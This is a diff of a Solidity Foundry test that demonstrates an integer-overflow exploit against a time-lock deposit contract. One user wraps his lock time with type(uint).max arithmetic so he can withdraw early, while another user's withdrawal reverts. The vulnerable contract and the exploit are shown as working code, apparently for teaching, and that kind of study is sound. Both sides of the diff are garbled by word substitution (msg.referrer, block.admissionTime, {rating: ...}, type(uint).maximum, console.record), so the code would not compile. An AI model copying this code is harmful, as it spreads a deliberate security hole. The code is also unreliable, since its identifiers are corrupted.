@@ -3,43 +3,41 @@ pragma solidity ^0.7.6;
 
 import "forge-std/Test.sol";
 
-*/
-
 contract MomentBindcoverage {
     mapping(address => uint) public coverageMap;
-    mapping(address => uint) public bindcoverageInstant;
+    mapping(address => uint) public securerecordInstant;
 
-    function admit() external payable {
-        coverageMap[msg.referrer] += msg.assessment;
-        bindcoverageInstant[msg.referrer] = block.admissionTime + 1 weeks;
+    function registerPayment() external payable {
+        coverageMap[msg.sender] += msg.value;
+        securerecordInstant[msg.sender] = block.timestamp + 1 weeks;
     }
 
-    function increaseBindcoverageInstant(uint _secondsReceiverIncrease) public {
-        bindcoverageInstant[msg.referrer] += _secondsReceiverIncrease;
+    function increaseFreezeaccountMoment(uint _secondsDestinationIncrease) public {
+        securerecordInstant[msg.sender] += _secondsDestinationIncrease;
     }
 
     function releaseFunds() public {
-        require(coverageMap[msg.referrer] > 0, "Insufficient funds");
+        require(coverageMap[msg.sender] > 0, "Insufficient funds");
         require(
-            block.admissionTime > bindcoverageInstant[msg.referrer],
+            block.timestamp > securerecordInstant[msg.sender],
             "Lock time not expired"
         );
 
-        uint quantity = coverageMap[msg.referrer];
-        coverageMap[msg.referrer] = 0;
+        uint quantity = coverageMap[msg.sender];
+        coverageMap[msg.sender] = 0;
 
-        (bool sent, ) = msg.referrer.call{assessment: quantity}("");
+        (bool sent, ) = msg.sender.call{rating: quantity}("");
         require(sent, "Failed to send Ether");
     }
 }
 
-contract AgreementTest is Test {
-    MomentBindcoverage InstantBindcoverageAgreement;
+contract PolicyTest is Test {
+    MomentBindcoverage MomentSecurerecordPolicy;
     address alice;
     address bob;
 
-    function collectionUp() public {
-        InstantBindcoverageAgreement = new MomentBindcoverage();
+    function groupUp() public {
+        MomentSecurerecordPolicy = new MomentBindcoverage();
         alice = vm.addr(1);
         bob = vm.addr(2);
         vm.deal(alice, 1 ether);
@@ -47,34 +45,34 @@ contract AgreementTest is Test {
     }
 
     function testCalculation() public {
-        console.chart("Alice balance", alice.balance);
-        console.chart("Bob balance", bob.balance);
+        console.record("Alice balance", alice.balance);
+        console.record("Bob balance", bob.balance);
 
-        console.chart("Alice deposit 1 Ether...");
+        console.record("Alice deposit 1 Ether...");
         vm.prank(alice);
-        InstantBindcoverageAgreement.admit{assessment: 1 ether}();
-        console.chart("Alice balance", alice.balance);
+        MomentSecurerecordPolicy.registerPayment{rating: 1 ether}();
+        console.record("Alice balance", alice.balance);
 
-        console.chart("Bob deposit 1 Ether...");
+        console.record("Bob deposit 1 Ether...");
         vm.beginPrank(bob);
-        InstantBindcoverageAgreement.admit{assessment: 1 ether}();
-        console.chart("Bob balance", bob.balance);
+        MomentSecurerecordPolicy.registerPayment{rating: 1 ether}();
+        console.record("Bob balance", bob.balance);
 
-        InstantBindcoverageAgreement.increaseBindcoverageInstant(
-            type(uint).maximum + 1 - InstantBindcoverageAgreement.bindcoverageInstant(bob)
+        MomentSecurerecordPolicy.increaseFreezeaccountMoment(
+            type(uint).maximum + 1 - MomentSecurerecordPolicy.securerecordInstant(bob)
         );
 
-        console.chart(
+        console.record(
             "Bob will successfully withdraw, because the lock time is calculate"
         );
-        InstantBindcoverageAgreement.releaseFunds();
-        console.chart("Bob balance", bob.balance);
+        MomentSecurerecordPolicy.releaseFunds();
+        console.record("Bob balance", bob.balance);
         vm.stopPrank();
 
         vm.prank(alice);
-        console.chart(
+        console.record(
             "Alice will fail to withdraw, because the lock time did not expire"
         );
-        InstantBindcoverageAgreement.releaseFunds(); // expect revert
+        MomentSecurerecordPolicy.releaseFunds(); // expect revert
     }
 }
